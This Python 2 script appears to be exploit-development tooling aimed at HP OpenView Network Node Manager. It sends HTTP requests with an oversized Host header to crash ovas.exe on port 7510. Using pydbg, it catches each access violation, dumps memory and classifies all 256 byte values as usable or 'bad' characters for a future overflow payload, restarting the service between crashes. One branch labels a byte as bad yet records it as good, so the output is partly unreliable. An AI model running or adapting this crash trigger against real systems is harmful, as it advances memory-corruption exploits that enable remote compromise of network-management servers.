from pydbg import *
from pydbg.defines import *
import sys, time, wmi, socket, os, time, threading, binascii

all_chars = (
'\x00','\x01','\x02','\x03','\x04','\x05','\x06','\x07','\x08','\x09','\x0a','\x0b','\x0c','\x0d','\x0e','\x0f',
'\x10','\x11','\x12','\x13','\x14','\x15','\x16','\x17','\x18','\x19','\x1a','\x1b','\x1c','\x1d','\x1e','\x1f',
'\x20','\x21','\x22','\x23','\x24','\x25','\x26','\x27','\x28','\x29','\x2a','\x2b','\x2c','\x2d','\x2e','\x2f',
'\x30','\x31','\x32','\x33','\x34','\x35','\x36','\x37','\x38','\x39','\x3a','\x3b','\x3c','\x3d','\x3e','\x3f',
'\x40','\x41','\x42','\x43','\x44','\x45','\x46','\x47','\x48','\x49','\x4a','\x4b','\x4c','\x4d','\x4e','\x4f',
'\x50','\x51','\x52','\x53','\x54','\x55','\x56','\x57','\x58','\x59','\x5a','\x5b','\x5c','\x5d','\x5e','\x5f',
'\x60','\x61','\x62','\x63','\x64','\x65','\x66','\x67','\x68','\x69','\x6a','\x6b','\x6c','\x6d','\x6e','\x6f',
'\x70','\x71','\x72','\x73','\x74','\x75','\x76','\x77','\x78','\x79','\x7a','\x7b','\x7c','\x7d','\x7e','\x7f',
'\x80','\x81','\x82','\x83','\x84','\x85','\x86','\x87','\x88','\x89','\x8a','\x8b','\x8c','\x8d','\x8e','\x8f',
'\x90','\x91','\x92','\x93','\x94','\x95','\x96','\x97','\x98','\x99','\x9a','\x9b','\x9c','\x9d','\x9e','\x9f',
'\xa0','\xa1','\xa2','\xa3','\xa4','\xa5','\xa6','\xa7','\xa8','\xa9','\xaa','\xab','\xac','\xad','\xae','\xaf',
'\xb0','\xb1','\xb2','\xb3','\xb4','\xb5','\xb6','\xb7','\xb8','\xb9','\xba','\xbb','\xbc','\xbd','\xbe','\xbf',
'\xc0','\xc1','\xc2','\xc3','\xc4','\xc5','\xc6','\xc7','\xc8','\xc9','\xca','\xcb','\xcc','\xcd','\xce','\xcf',
'\xd0','\xd1','\xd2','\xd3','\xd4','\xd5','\xd6','\xd7','\xd8','\xd9','\xda','\xdb','\xdc','\xdd','\xde','\xdf',
'\xe0','\xe1','\xe2','\xe3','\xe4','\xe5','\xe6','\xe7','\xe8','\xe9','\xea','\xeb','\xec','\xed','\xee','\xef',
'\xf0','\xf1','\xf2','\xf3','\xf4','\xf5','\xf6','\xf7','\xf8','\xf9','\xfa','\xfb','\xfc','\xfd','\xfe','\xff'
)

good_chars = [ ]
bad_chars = [ ]

forcedExit = False
pyReady = False
cbyte = 0
lbyte = 0

def findPid():
    print "[+] Searching for ovas.exe PID"
    c = wmi.WMI()
    for process in c.Win32_Process():
        if process.Name == 'ovas.exe':
            return (process.ProcessId)
    return 0

def svcRestart():
    print "[+] Restarting NNM service"
    os.system('ovstop -c ovas')
    time.sleep(1)
    os.system('ovstart -c ovas')
    time.sleep(1)
    return

def sendBuffer(buffer):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        print "[E] Can't open socket"
        sys.exit(1)
    s.connect(('127.0.0.1', 7510))
    s.send(buffer)
    s.close()
    return


def isBadChar(buffer):
    global lbyte, good_chars, bad_chars
    hexdata = dbg.hex_dump(buffer)
    print (hexdata)
    lbyte = cbyte
    if buffer == "http://"+ "A"*8 + all_chars[cbyte]*92 + "C"*8:
        good_chars.append(all_chars[cbyte])
        print "[+] %s is a good char" % (binascii.hexlify(all_chars[cbyte]))
        return
    else:
        bad_chars.append(all_chars[cbyte])
        print "[-] %s is a bad char" % (binascii.hexlify(all_chars[cbyte]))
        return

def avHandler(dbg):
    global pyReady
    pyReady = False
    print "[+] Got an access violation"
    offset = 64
    buffer = dbg.read(dbg.context.Ecx + offset, 0x73)
    isBadChar(buffer)

    dbg.detach()
    svcRestart()
    return DBG_EXCEPTION_NOT_HANDLED

def startDBG(pid):
    global forcedExit
    print "[+] Starting a new pydbg instance for pid %d" % (pid)
    dbg = pydbg()
    dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, avHandler)
    while True:
        try:
            if dbg.attach(pid):
                return dbg
            else:
                return False
        except:
            print "[D] Error in attaching pydbg"
            forcedExit=True
            sys.exit()

def genBuffer(cchar):
    buffer = ""
    buffer += "GET /topology/home HTTP/1.1\r\n"
    buffer += "Host: "
    buffer += "\x41" * 8
    buffer += cchar * 92
    buffer += "\x43" * 3948
    buffer += ":7510\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:50.0)\r\n\r\n"
    return buffer

def genCrash():
    time.sleep(5)
    global cbyte
    print "[D] Starting crash thread"
    i = 0
    while i < len(all_chars):
        if forcedExit:
            return
        if pyReady:
            cchar = all_chars[i]
            print "[+] Sending buffer for char %s" % (binascii.hexlify(cchar))
            buffer = genBuffer(cchar)
            sendBuffer(buffer)
            cbyte = i
            time.sleep(10)
            if lbyte == i:
                i += 1
            else:
                time.sleep(10)
                if lbyte == i:
                    i += 1
                else:
                    print "[D] %s is a bad char"  % (binascii.hexlify(cchar))
                    good_chars.append(cchar)
                    i += 1
        else:
            if pyReady:
                print "[D] PyDBG is ready"
            else:
                print "[D] PyDBG is not ready"
            time.sleep(2)
    print "[+] Good chars are:"
    print (good_chars)
    print "[+] Bad chars are:"
    print (bad_chars)

if __name__ == '__main__':
    global pid
    oldpid = 0

    ct = threading.Thread(target = genCrash)
    ct.setDaemon(0)
    ct.start()

    while True:
        pid = findPid()
        if pid != 0:
            print "[D] NNM has process id of: %d" % (pid)
            dbg = startDBG(pid)
            if dbg:
                pyReady = True
                dbg.run()
            else:
                print "[D] Can not attach pydbg"
                sys.exit()
        else:
            svcRestart()
